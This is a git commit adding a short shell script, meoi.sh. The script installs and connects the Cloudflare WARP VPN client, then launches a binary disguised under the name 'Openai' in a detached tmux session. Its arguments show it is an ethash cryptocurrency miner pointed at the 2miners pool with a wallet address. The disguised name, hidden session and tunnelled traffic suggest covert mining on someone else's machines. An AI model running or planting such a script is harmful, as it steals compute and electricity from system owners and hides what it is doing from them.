d923feb1c289ee55c7bab01928bfea85d9aef913
haidanglx <40859600+haidanglx@users.noreply.github.com>
2021-12-21 12:18:31 +0800

    Create meoi.sh

---
+++ meoi.sh
@@ -0,0 +1,12 @@
+#!/bin/sh
+wget https://pkg.cloudflareclient.com/uploads/cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
+sudo dpkg -i cloudflare_warp_2021_8_0_1_amd64_844183db02.deb
+sudo systemctl enable --now warp-svc.service
+warp-cli set-mode warp+doh
+warp-cli register
+warp-cli enable-always-on
+warp-cli connect
+
+tmux new-session -d -s my_session111 './Openai --algo ethash --server eth.2miners.com:2020 --user 0xcfEE82DA221E743051d71c24e6d0b75Bd094A819.sproxy2'
+
+
